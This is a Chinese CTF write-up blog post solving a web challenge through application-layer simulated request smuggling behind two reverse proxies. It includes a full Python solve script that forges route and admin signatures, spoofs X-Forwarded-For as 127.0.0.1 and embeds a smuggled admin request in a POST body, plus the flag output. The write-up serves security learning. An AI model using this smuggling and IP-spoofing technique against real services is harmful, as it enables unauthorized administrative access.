+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_route_key</span>(<span class="params">user_id, token, trace_bytes</span>):</span><br><span class="line">    seed = <span class="string">f&quot;<span class="subst">&#123;user_id&#125;</span>:<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;trace_bytes&#125;</span>:sync:v2&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(seed.encode()).hexdigest()[:<span class="number">20</span>]</span><br></pre></td></tr></table></figure>
+
+<h3 id="计算关键变量-trace-bytes"><a href="#计算关键变量-trace-bytes" class="headerlink" title="计算关键变量 trace_bytes"></a>计算关键变量 <code>trace_bytes</code></h3><p>根据 <code>app.py</code> 中的 <code>PROXY_TRACE_HEADERS</code> 列表：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PROXY_TRACE_HEADERS = [</span><br><span class="line">    <span class="string">&#x27;X-Haproxy-Version&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Proxy-Instance&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Apache-Layer&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Backend-Route&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>我们需要计算以下四个 Header 在经过所有代理后的总长度，这四个Header分别可以在haproxy.cfg和<code>httpd.conf</code>文件中找到：</p>
+<table>
+<thead>
+<tr>
+<th>Header 名称</th>
+<th>值 (Value)</th>
+<th>计算长度 (Key + “: “ + Value + “\r\n”)</th>
+<th>字节数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>X-Haproxy-Version</strong></td>
+<td>“2.0.14”</td>
+<td><code>X-Haproxy-Version: 2.0.14\r\n</code></td>
+<td>17+2+6+2 &#x3D; <strong>27</strong></td>
+</tr>
+<tr>
+<td><strong>X-Proxy-Instance</strong></td>
+<td>“frontend-01”</td>
+<td><code>X-Proxy-Instance: frontend-01\r\n</code></td>
+<td>16+2+11+2 &#x3D; <strong>31</strong></td>
+</tr>
+<tr>
+<td><strong>X-Apache-Layer</strong></td>
+<td>“reverse-proxy”</td>
+<td><code>X-Apache-Layer: reverse-proxy\r\n</code></td>
+<td>14+2+13+2 &#x3D; <strong>31</strong></td>
+</tr>
+<tr>
+<td><strong>X-Backend-Route</strong></td>
+<td>“layer3”</td>
+<td><code>X-Backend-Route: layer3\r\n</code></td>
+<td>15+2+6+2 &#x3D; <strong>25</strong></td>
+</tr>
+<tr>
+<td><strong>总计 (TRACE_BYTES)</strong></td>
+<td></td>
+<td><strong>27 + 31 + 31 + 25</strong></td>
+<td><strong>114</strong></td>
+</tr>
+</tbody></table>
+<p>所以trace_bytes应该是114</p>
+<h3 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h3><p>获取session：</p>
+<ol>
+<li>访问 <code>/</code> 获取 <code>user_id</code></li>
+<li>向 <code>/con</code> 发送带请求体的 POST 请求，获取 <code>session_token</code></li>
+</ol>
+<p>提升session的depth：</p>
+<ol>
+<li><p>向&#x2F;con端点发送POST请求，将depth提升到1</p>
+</li>
+<li><p>计算router key，请求&#x2F;api&#x2F;v1&#x2F;sync，将depth提升到2</p>
+</li>
+</ol>
+<p>对走私的请求的构造：</p>
+<ol>
+<li>请求路径为&#x2F;admin&#x2F;report</li>
+<li>设置ip为127.0.0.1，trace_bytes为114</li>
+<li>用build_admin_signature的逻辑计算出的签名</li>
+</ol>
+<p>最后构造请求走私报文，提交到 <code>/api/v1/data</code></p>
+<p>需要注意一下代码要求 <code>if body and &#39;\r\n\r\n&#39; in body</code>，换行符需要很严谨地处理。题解脚本：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://124.16.75.116:52003&quot;</span></span><br><span class="line">TRACE_BYTES = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">data, length</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(data.encode()).hexdigest()[:length]</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 获取 ID</span></span><br><span class="line">s.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/&quot;</span>)</span><br><span class="line">uid = s.cookies.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] User ID: <span class="subst">&#123;uid&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 升级到 Depth 1</span></span><br><span class="line">s.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/con&quot;</span>, data=<span class="string">&quot;level_up&quot;</span>)</span><br><span class="line">token = s.cookies.get(<span class="string">&#x27;session_token&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Session Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 升级到 Depth 2</span></span><br><span class="line">route_key = get_hash(<span class="string">f&quot;<span class="subst">&#123;uid&#125;</span>:<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;TRACE_BYTES&#125;</span>:sync:v2&quot;</span>, <span class="number">20</span>)</span><br><span class="line">s.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/api/v1/sync&quot;</span>, headers=&#123;<span class="string">&#x27;X-Route-Key&#x27;</span>: route_key&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Synced depth 2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 准备最后的打击</span></span><br><span class="line">admin_path = <span class="string">&quot;/admin/report&quot;</span></span><br><span class="line">method = <span class="string">&quot;GET&quot;</span></span><br><span class="line">signature = get_hash(<span class="string">f&quot;<span class="subst">&#123;uid&#125;</span>:<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;TRACE_BYTES&#125;</span>:<span class="subst">&#123;method&#125;</span>:<span class="subst">&#123;admin_path&#125;</span>:admin:v2&quot;</span>, <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 核心：构造严格符合后端 split(&#x27;\r\n&#x27;) 要求的二进制流</span></span><br><span class="line"><span class="comment"># 注意：最后必须以 \r\n\r\n 结尾</span></span><br><span class="line">lines = [</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;admin_path&#125;</span> HTTP/1.1&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;X-Forwarded-For: 127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;X-Trace-Offset: <span class="subst">&#123;TRACE_BYTES&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;X-Trace: <span class="subst">&#123;signature&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;Cookie: user_id=<span class="subst">&#123;uid&#125;</span>; session_token=<span class="subst">&#123;token&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 这行配合下面的 join 会产生 \r\n\r\n</span></span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">]</span><br><span class="line">smuggled_body = <span class="string">&quot;\r\n&quot;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求，注意 data 传字符串，requests 默认会处理编码</span></span><br><span class="line">res = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/api/v1/data&quot;</span>, data=smuggled_body)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Full Response: <span class="subst">&#123;res.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] Flag: <span class="subst">&#123;res.json().get(<span class="string">&#x27;flag&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] User ID: 71fe03fb-36cb-4efd-9a30-f1778aca3593</span><br><span class="line">[+] Session Token: dce62051-3988-4a6b-a3ce-7bcb237e52bb</span><br><span class="line">[*] Synced depth 2</span><br><span class="line">--------------------</span><br><span class="line">[*] Full Response: &#123;&quot;flag&quot;:&quot;flag&#123;double_proxy_single_flag&#125;&quot;,&quot;message&quot;:&quot;Access granted&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;timestamp&quot;:1775734155&#125;</span><br><span class="line"></span><br><span class="line">[!] Flag: flag&#123;double_proxy_single_flag&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;double_proxy_single_flag&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="技术点总结"><a href="#技术点总结" class="headerlink" title="技术点总结"></a>技术点总结</h2><ol>
+<li><p><strong>多层反向代理架构</strong>：多层反向代理是指在客户端与后端服务器之间部署多个中转节点。每经过一层代理，代理服务器都可能根据配置对 HTTP 报文进行修改，比如修改 <code>X-Forwarded-For</code> 头部以记录原始 IP，或插入自定义的追踪 ID。</p>
+</li>
+<li><p><strong>权限提升状态机</strong>：状态机是一种控制逻辑，用于确保用户必须按照预设的线性或分支路径执行操作。权限提升状态机中，用户初始处于未授权状态，必须通过一系列特定的行为来触发状态迁移。只有当前状态满足目标操作的准入条件时，系统才允许执行该操作并可能将其提升至下一状态。这种设计被用于防止越权访问。</p>
+</li>
+<li><p><strong>应用层模拟请求走私</strong>：请求走私本质上源于解析歧义。传统走私是由于在代理与后端对 HTTP 协议标准的实现差异，而应用层模拟走私则利用了后端应用程序在处理报文内容时的二次解析漏洞。攻击者可以在请求体中嵌入一个完整的、伪造的 HTTP 报文，后端代码可能将嵌入数据当成另一个请求来处理。这种方式通常用于绕过前端代理的路径过滤或 IP 限制。</p>
+</li>
+<li><p><strong>消息摘要与数字签名</strong>：消息摘要是利用散列函数将任意长度的数据映射为固定长度的字符串，具有不可逆性和雪崩效应。而数字签名则是摘要技术的进阶应用，通常结合“盐值”或私钥进行计算。其核心目的是保证数据的完整性和不可否认性。</p>
+</li>
+<li><p><strong>IP 来源伪造与绕过</strong>：如果后端服务器未经校验就直接信任请求头中的 <code>X-Forwarded-For</code> 字段，攻击者就可以在 HTTP 请求中手动构造该头部，填入受信任的地址，从而绕过原本针对外部网络的防火墙规则或身份验证逻辑。</p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Mintind
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/" title="smuggle应用层模拟请求走私">https://mintind.github.io/2026/04/08/CTF/Web/smuggle-web2/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/04/08/CTF/Web/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/" rel="prev" title="gogogo路径穿越">
+                  <i class="fa fa-angle-left"></i> gogogo路径穿越
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/04/10/Notes/%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/" rel="next" title="英文学术论文写作笔记">
+                  英文学术论文写作笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+  <div class="languages">
+    <label class="lang-select-label">
+      <i class="fa fa-language"></i>
+      <span>简体中文</span>
+      <i class="fa fa-angle-up" aria-hidden="true"></i>
+    </label>
+    <select class="lang-select" data-canonical="" aria-label="选择语言">
+      
+        <option value="zh-CN" data-href="/2026/04/08/CTF/Web/smuggle-web2/" selected="">
+          简体中文
+        </option>
+      
+        <option value="en" data-href="/en/2026/04/08/CTF/Web/smuggle-web2/" selected="">
+          English
+        </option>
+      
+    </select>
+  </div>
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mintind</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">203k</span>
+  </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
